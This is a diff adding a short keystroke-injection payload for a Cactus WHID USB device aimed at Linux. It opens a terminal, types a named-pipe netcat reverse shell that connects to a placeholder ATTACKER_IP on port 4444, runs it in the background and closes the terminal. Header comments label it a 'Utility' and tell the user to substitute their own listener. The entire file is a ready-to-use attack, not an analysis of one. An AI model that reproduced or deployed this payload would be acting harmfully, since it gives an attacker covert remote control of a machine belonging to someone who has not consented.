@@ -1,0 +1,13 @@
+REM === Cactus WHID Payload: Linux Netcat Reverse Shell ===
+REM Target: Linux
+REM Category: Utility (Quick Access)
+REM Description: Opens terminal and runs netcat reverse shell - simpler alternative
+REM Replace: ATTACKER_IP and port 4444 with your listener
+DELAY 1000
+CTRL ALT t
+DELAY 800
+STRING rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f &
+ENTER
+DELAY 200
+STRING exit
+ENTER
